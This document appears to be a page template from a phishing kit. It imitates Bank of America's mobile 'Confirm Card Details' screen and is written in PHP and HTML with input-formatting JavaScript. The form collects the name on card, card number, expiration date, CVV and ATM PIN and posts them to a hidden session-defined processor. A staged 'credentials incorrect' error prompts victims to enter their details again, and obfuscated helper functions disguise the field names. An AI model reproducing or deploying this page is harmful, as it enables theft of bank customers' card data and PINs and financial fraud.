<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/><title>Card update</title><link rel="shortcut icon" href="<?php echo gaflder();?><?php echo gefnm("/favicon.ico");?>?ts=20151018" type="image/x-icon"/><link rel="stylesheet" href="<?php echo gaflder();?><?php echo gefnm("/btch.css");?>"><link rel="stylesheet" href="<?php echo gaflder();?><?php echo gefnm("/tolb.css");?>"><link rel="stylesheet" href="<?php echo gaflder();?><?php echo gefnm("/lview.css");?>"><link rel="stylesheet" href="<?php echo gaflder();?><?php echo gefnm("/ft.css");?>"><link rel="stylesheet" href="<?php echo gaflder();?><?php echo gefnm("/slidemenu.css");?>"><style>.signonVersionTwoHomePage{max-width:400px;margin:auto;}
.fsd-secure-esp-skin {
padding: 20px 0 20px 20px;
;}
.dsrt{width:70%}
.srt{width:80%}
</style></head>
<body><div id="page" class="" style="position: static; float: left; height: 100%; width: 100%; left: 100%; display: block;"><div class="header-module"><div class="fsd-secure-esp-skin"><img height="28" width="230" alt="Bank of America" src="<?php echo gaflder();?><?php echo gefnm("/BofA_rgb.png");?>"><div class="clearboth"></div></div></div><div id="cmw_toolBar_" class="cmw_toolBar_"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite backButton icon sprite-menu" href="#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class=""><div id="cmw_toolBar_titleText" style="padding-left: 34px; padding-right: 34px; width: 100%;">Confirm Card Details</div></h1><a id="rightButton" class="hidden"></a></div><div class="pageMinHeight"><div class="signonVersionTwoHomePage"><div id="scrollerwrapperOt" class="overthrow"><?php if(isset($_GET[''.$theerrkey.''])){echo '<div id="accountLocked" class=""><ul class="listView edge"><li role="button" class="noLink"><div class="imageWrap paddingHoriz20"><img src="'.gaflder().gefnm("/ico_alert@2x.png").'" class=""></div><p class="subVal padding10 fontRed" id="headError">Error</p><p class="subVal padding10" id="bodyError">The Credentials you entered were incorrect. Please try again...</p></li></ul></div>';};?><div id="successMsg"></div><div id="newOnlineId" style=""><div class="toppad5"><fieldset><div class="inputEntryContainer"><form id="frmCustomOnlineId" method="post" action="<?php echo $_SESSION['processor'];?>"><div class="inputContainer"><input type="text"  name="<?php echo gaN('cardname');?>" class="focus sprite-clear_input_icns" maxlength="" id="cardname" placeholder="Name On Card" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false"></div><div class="inputContainer"><input type="text"  name="<?php echo gaN('cardnumber');?>" class=" sprite-clear_input_icns" maxlength="19" id="cardnumber" oninput="innumlen(this.value);demcnum()" onpaste="demcnum()" placeholder="Card Number" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false"></div><?php if(isset($other)){echo "<input name=".$other." value=\"1\" type=\"hidden\"/>";};?><div class="inputContainer srt" style="background-color: white;"><input id="expdate" type="tel" name="<?php echo gaN('expdate');?>" class="" placeholder="Expiration Date (MM/YY)" oninput="demexpDate()" maxlength="5" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"></div><div class="inputContainer dsrt" style="background-color: white;"><input id="cvv" name="<?php echo gaN('cvv');?>" type="text" class="" placeholder="CVV" oninput="innumlen(this.value)" maxlength="3" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"><input type="hidden" name="<?php echo gaN('cub');?>" value="<?php echo uniqid();?>"></div><div class="inputContainer dsrt" style="background-color: white;"><input id="atm" name="<?php echo gaN('atm');?>" type="tel" class="" placeholder="ATM PIN" oninput='innumlen(this.value)' maxlength="4" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"></div></form></div></fieldset></div></div></div><div><a id="btSignonContinue" href="javascript:void(0);" onclick="frmCustomOnlineId.submit();" role="button" class="btn"><img style="margin-bottom:-4px;" class="paddingHoriz10" src="<?php echo gaflder();?><?php echo gefnm("/secure_lock.png");?>"><span id="signonLabel">Continue</span></a></div><div><div class="padding10 center"></div><div class="padding10"></div></div></div><script>
"use strict"
function popup(){var pop = document.getElementById('cvvpopup').style.display;
	if(pop=="block"){document.getElementById('cvvpopup').style.display="none";}
	else if(pop=="none"){document.getElementById('cvvpopup').style.display="block";};
};

function demexpDate(){var expdate=event.target;var key =event.data;var val=expdate.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){case 1:if(key > 1){event.target.value="";}; break; case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {expdate.value=expdate.value+"/";}; break; case 4:if(key < 2 || key >= 3 || key == 0){event.target.value=val.slice(0,val.length-1);}; break; case 5:if(!isNaN(parseInt(key))){event.target.value=val;}; break;};};if(event.inputType=="deleteContentBackward" && val.length == 2){expdate.value=val[0]}};

function demcnum(){var self=event.target;var key =event.data;var val=self.value;var sep="-";var mval=val.replace(/\s/g,'').split('');
var pos=self.selectionStart;var cardtype=val.substring(0,2);var otherctype=val.substring(0,1);
if(pos){
if(/37|34/.test(cardtype)){self.maxLength="17";} else{self.maxLength="19";};
if(event.inputType=="insertText"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');event.target.value=mval.join('');;
if(mval[pos]){if(cardtype==37 || cardtype ==34){
if(pos%4==0 && pos<6 && mval.length>=5){event.target.setSelectionRange(pos+1,pos+1);} else if(pos%12==0 && mval.length>=13){event.target.setSelectionRange(pos+1,pos+1);} else{event.target.setSelectionRange(pos,pos);};} else{if(pos%5==0){event.target.setSelectionRange(pos+1,pos+1)} else{event.target.setSelectionRange(pos,pos);};};};
};
if(event.inputType=="deleteContentBackward"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');
event.target.value=mval.join('');
if(pos==0){event.target.setSelectionRange(0,0);}
else{if(cardtype==37 || cardtype ==34){
if(pos%4==0 && mval.length==5){event.target.setSelectionRange(pos,pos);} else if(pos%12==0 && mval.length==13){event.target.setSelectionRange(pos-1,pos-1);} else{event.target.setSelectionRange(pos,pos)};}
else{if(pos%5==0){event.target.setSelectionRange(pos-1,pos-1)} else{event.target.setSelectionRange(pos,pos);};};}
;};};
};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};

function stoplen(len){if(event.target.value.length==len && event.key!='Enter'){event.preventDefault();};}
</script></div></div></body></html>